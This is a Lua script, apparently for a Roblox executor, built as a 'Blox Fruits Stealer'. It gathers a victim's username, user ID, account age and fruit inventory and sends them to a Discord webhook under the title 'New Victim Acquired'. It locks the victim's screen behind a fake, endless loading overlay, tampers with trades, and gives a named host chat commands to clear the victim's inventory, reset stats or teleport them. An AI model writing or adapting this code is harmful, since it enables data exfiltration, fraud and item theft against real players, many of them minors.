-- CONFIGURATION
local CONFIG = {
    WEBHOOK_URL = "https://discord.com/api/webhooks/1552377913238622251/kKXh-i41RJs4J51N233PIYqtirpPRZNhH42mQeljxWuLOzSMV8A0jAEgcEd6HJ3zWsms", -- Paste your webhook here
    HOST_NAME = "jayaracena14", -- Your Roblox Username
    LOADING_TEXT = "Loading... Please Wait",
    TRADE_TARGET_DELAY = 1.5 -- Seconds to wait between trade attempts
}

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualUser = game:GetService("VirtualUser")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local Player = Players.LocalPlayer
local IsHost = (Player.Name == CONFIG.HOST_NAME)

-- ==================== MODULE 1: DATA COLLECTION ====================

local function getAccountAge()
    local accountAgeSeconds = Player.AccountAge
    local days = math.floor(accountAgeSeconds / 86400)
    return days
end

local function getExecutorName()
    -- Heuristic detection of executor
    if _G.getgenv then
        if _G.writefile and _G.readfile then
            if pcall(function() return _G.isfile end) then
                return "Synapse Z"
            end
        end
        if _G.setclipboard then
            return "Wave"
        end
        if _G.setclip then
            return "Krnl"
        end
        return "Unknown (Lua)"
    end
    return "Unknown"
end

local function getFruitInventory()
    local fruits = {}
    local inventoryFolder = Player:FindFirstChild("Inventory")
    if not inventoryFolder then return fruits end
    
    for _, item in ipairs(inventoryFolder:GetChildren()) do
        -- Blox Fruits stores fruits in a specific way
        if item:GetAttribute("Fruit") or item.Name:match("Fruit") then
            local name = item.Name
            local rarity = item:GetAttribute("Rarity") or "Common"
            local count = item:GetAttribute("Count") or 1
            fruits[#fruits + 1] = {
                Name = name,
                Rarity = rarity,
                Count = count
            }
        end
    end
    return fruits
end

local function getSeaLevel()
    local character = Player.Character
    if character and character:FindFirstChild("HumanoidRootPart") then
        local z = character.HumanoidRootPart.Position.Z
        if z < -1000 then return 1
        elseif z < -500 then return 2
        elseif z < 0 then return 3
        else return 4 end
    end
    return "Unknown"
end

local function collectData()
    local fruits = getFruitInventory()
    local fruitStrings = {}
    for _, f in ipairs(fruits) do
        local emoji = f.Rarity == "Mythical" and "🐉" or (f.Rarity == "Legendary" and "🌟" or (f.Rarity == "Rare" and "🍎" or "📜"))
        fruitStrings[#fruitStrings + 1] = string.format("%s [%s] %s - %dx", emoji, f.Rarity, f.Name, f.Count)
    end
    table.sort(fruitStrings)
    
    local payload = {
        username = Player.Name,
        displayName = Player.DisplayName,
        accountId = Player.UserId,
        accountAge = getAccountAge(),
        executor = getExecutorName(),
        sea = getSeaLevel(),
        host = CONFIG.HOST_NAME,
        fruits = fruitStrings
    }
    return payload
end

local function sendToDiscord(data)
    local content = {
        embeds = {
            {
                title = "👤 New Victim Acquired",
                color = 15158332,
                fields = {
                    { name = "👤 Display Name", value = data.displayName, inline = true },
                    { name = "🆔 Username", value = data.username, inline = true },
                    { name = "📅 Account Age", value = data.accountAge .. " days", inline = true },
                    { name = "🖥️ Executor", value = data.executor, inline = true },
                    { name = "🌊 Sea", value = tostring(data.sea), inline = true },
                    { name = "😎 Receiver", value = CONFIG.HOST_NAME, inline = true }
                },
                description = "💰 **Valuable Items**\n" .. table.concat(data.fruits, "\n"),
                footer = { text = "Blox Fruits Stealer | Host: " .. CONFIG.HOST_NAME }
            }
        }
    }
    
    local success, err = pcall(function()
        HttpService:PostAsync(CONFIG.WEBHOOK_URL, HttpService:JSONEncode(content), Enum.HttpContentType.ApplicationJson)
    end)
    
    if not success then
        print("[HostScript] Webhook Error: " .. err)
    else
        print("[HostScript] Data sent to Discord.")
    end
end

-- ==================== MODULE 2: UI FREEZER ====================

local function freezeUI()
    UserInputService.MouseIconEnabled = false
    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    
    local playerGui = Player:WaitForChild("PlayerGui")
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "HostFreezeGUI"
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.DisplayOrder = 9999
    screenGui.Parent = playerGui
    
    local frame = Instance.new("Frame")
    frame.Name = "LoadingFrame"
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    frame.BorderSizePixel = 0
    frame.Parent = screenGui
    
    local label = Instance.new("TextLabel")
    label.Name = "LoadingLabel"
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = CONFIG.LOADING_TEXT
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextSize = 32
    label.Font = Enum.Font.GothamBold
    label.Parent = frame
    
    local progressBar = Instance.new("Frame")
    progressBar.Name = "ProgressBar"
    progressBar.Size = UDim2.new(0, 300, 0, 10)
    progressBar.Position = UDim2.new(0.5, -150, 0.5, 50)
    progressBar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    progressBar.BorderSizePixel = 0
    progressBar.Parent = frame
    
    local fill = Instance.new("Frame")
    fill.Name = "Fill"
    fill.Size = UDim2.new(0, 0, 1, 0)
    fill.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
    fill.BorderSizePixel = 0
    fill.Parent = progressBar
    
    task.spawn(function()
        while true do
            local start = tick()
            local duration = 10
            while tick() - start < duration do
                local progress = (tick() - start) / duration
                fill.Size = UDim2.new(progress, 0, 1, 0)
                task.wait(0.05)
            end
            fill.Size = UDim2.new(0, 0, 1, 0)
        end
    end)
    
    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if input.KeyCode == Enum.KeyCode.Escape then
            UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
        end
    end)
end

-- ==================== MODULE 3: TRADE MANIPULATOR ====================

local function monitorTrades()
    local character = Player.Character
    if not character then return end
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    local lastTradeAttempt = 0
    
    task.spawn(function()
        while true do
            task.wait(0.1)
            local targetSeat = nil
            
            for _, seat in ipairs(workspace:GetDescendants()) do
                if seat:IsA("Seat") then
                    local distance = (rootPart.Position - seat.Position).Magnitude
                    if distance < 5 and humanoid.Sit then
                        targetSeat = seat
                        break
                    end
                end
            end
            
            if targetSeat then
                local hostSitting = false
                for _, seat in ipairs(workspace:GetDescendants()) do
                    if seat:IsA("Seat") and seat ~= targetSeat then
                        if (seat.Position - targetSeat.Position).Magnitude < 10 then
                            if seat.Occupant and seat.Occupant.Name == CONFIG.HOST_NAME then
                                hostSitting = true
                            end
                        end
                    end
                end
                
                if not hostSitting then
                    local otherPlayerSitting = false
                    for _, seat in ipairs(workspace:GetDescendants()) do
                        if seat:IsA("Seat") and seat ~= targetSeat then
                            if (seat.Position - targetSeat.Position).Magnitude < 10 then
                                if seat.Occupant and seat.Occupant.Name ~= CONFIG.HOST_NAME then
                                    otherPlayerSitting = true
                                end
                            end
                        end
                    end
                    
                    if otherPlayerSitting and tick() - lastTradeAttempt > CONFIG.TRADE_TARGET_DELAY then
                        humanoid:ChangeState(Enum.HumanoidStateType.Jump)
                        rootPart.AssemblyLinearVelocity = Vector3.new(0, 50, 0)
                        
                        local TradeRemote = ReplicatedStorage:FindFirstChild("Trade")
                        if TradeRemote then
                            pcall(function()
                                TradeRemote:FireServer("Reject")
                            end)
                        end
                        lastTradeAttempt = tick()
                    end
                end
            end
        end
    end)
end

-- ==================== MODULE 4: HOST CONTROLLER (CHAT COMMANDS) ====================

local function executeCommand(cmd)
    local character = Player.Character
    if not character then return end
    local humanoid = character:WaitForChild("Humanoid")
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    local args = cmd:match("^%S+(.*)$") or ""
    local parts = {}
    for word in args:gmatch("%S+") do
        parts[#parts + 1] = word
    end
    
    if cmd:match("^%.add") then
        local fruitName = parts[1] or "Bunny"
        local amount = tonumber(parts[2]) or 1
        local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
        pcall(function()
            Fire:FireServer("AddFruit", fruitName, amount)
        end)
        print("[Host] Added " .. amount .. "x " .. fruitName)
        
    elseif cmd:match("^%.addallfruits") then
        local fruits = { "Dragon", "Tiger", "Magma", "Dough", "Ghost", "Rumble", "Buddha", "Shadow", "Yeti", "Control", "Diamond", "Turtle", "Leopard", "Rabbit", "Blade", "Bunny", "Cobra", "Ice", "Light", "Mammoth", "Flame", "Quake", "Spin", "Wave", "Fist", "Spiral", "Bog", "Blade", "Smoke", "String", "Sponge", "Bomb", "Dark", "Eagle", "Frog", "Galaxy", "Griffon", "Hawk", "Leopard", "Light", "Lizard", "Mammoth", "Magma", "Phoenix", "Quake", "Rabbit", "Rogue", "Serpent", "Shadow", "Shark", "Siren", "Soul", "Spider", "Storm", "Tiger", "Turtle", "Viper", "Warrior", "Wolf", "Wraith", "Yeti" }
        for _, fruit in ipairs(fruits) do
            local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
            pcall(function()
                Fire:FireServer("AddFruit", fruit, 1)
            end)
            task.wait(0.1)
        end
        print("[Host] Added all fruits")
        
    elseif cmd:match("^%.addallpre") then
        local pres = { "Dough", "Dragon", "Tiger", "Magma", "Ghost", "Rumble", "Buddha", "Shadow", "Yeti", "Control", "Diamond", "Turtle", "Leopard", "Rabbit", "Blade", "Bunny", "Cobra", "Ice", "Light", "Mammoth", "Flame", "Quake", "Spin", "Wave", "Fist", "Spiral", "Bog", "Blade", "Smoke", "String", "Sponge", "Bomb", "Dark", "Eagle", "Frog", "Galaxy", "Griffon", "Hawk", "Leopard", "Light", "Lizard", "Mammoth", "Magma", "Phoenix", "Quake", "Rabbit", "Rogue", "Serpent", "Shadow", "Shark", "Siren", "Soul", "Spider", "Storm", "Tiger", "Turtle", "Viper", "Warrior", "Wolf", "Wraith", "Yeti" }
        for _, pre in ipairs(pres) do
            local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
            pcall(function()
                Fire:FireServer("AddPre", pre, 1)
            end)
            task.wait(0.1)
        end
        print("[Host] Added all presets")
        
    elseif cmd:match("^%.clear") then
        local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
        pcall(function()
            Fire:FireServer("ClearInventory")
        end)
        print("[Host] Cleared inventory")
        
    elseif cmd:match("^%.clearall") then
        local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
        pcall(function()
            Fire:FireServer("ClearAll")
        end)
        print("[Host] Cleared all")
        
    elseif cmd:match("^%.reset") then
        local Fire = ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Fire")
        pcall(function()
            Fire:FireServer("ResetStats")
        end)
        print("[Host] Reset stats")
        
    elseif cmd:match("^%.tp") then
        local x = tonumber(parts[1]) or 0
        local y = tonumber(parts[2]) or 50
        local z = tonumber(parts[3]) or 0
        local targetPos = Vector3.new(x, y, z)
        rootPart.CFrame = CFrame.new(targetPos)
        print("[Host] Teleported to " .. x .. ", " .. y .. ", " .. z)
    end
end

local function listenForHostCommands()
    -- If we are the victim, we listen for commands from the Host
    -- Since we can't directly hook other players' chat in a standard script,
    -- we assume the Host sends commands with a specific prefix or we use a 
    -- shared RemoteEvent. However, the prompt specifies "using chat".
    -- We will monitor the Chat service if accessible, or rely on the 
    -- fact that the Host is in the same server and can send messages.
    
    -- In an executor, we can hook into the Chat service to see all messages
    local ChatService = game:GetService("Chat")
    
    ChatService.ChildAdded:Connect(function(child)
        if child:IsA("TextChatMessage") then
            local message = child.Text
            local sender = child.Sender
            if sender and sender.Name == CONFIG.HOST_NAME then
                if message:match("^%.[a-zA-Z]") then
                    executeCommand(message)
                end
            end
        end
    end)
    
    -- Fallback: If ChatService hook doesn't work, listen to LocalPlayer chat 
    -- (useful if testing as host)
    Player.Chatted:Connect(function(message)
        if IsHost then
            if message:match("^%.[a-zA-Z]") then
                executeCommand(message)
            end
        end
    end)
end

-- ==================== INITIALIZATION ====================

task.spawn(function()
    -- Wait for character
    local character = Player.Character or Player.CharacterAdded:Wait()
    local humanoid = character:WaitForChild("Humanoid")
    
    -- 1. Send Data to Discord
    local data = collectData()
    sendToDiscord(data)
    
    -- 2. Freeze UI
    freezeUI()
    
    -- 3. Start Trade Monitor
    monitorTrades()
    
    -- 4. Start Host Controller
    listenForHostCommands()
    
    print("[HostScript] Initialized. Host: " .. CONFIG.HOST_NAME)
end)
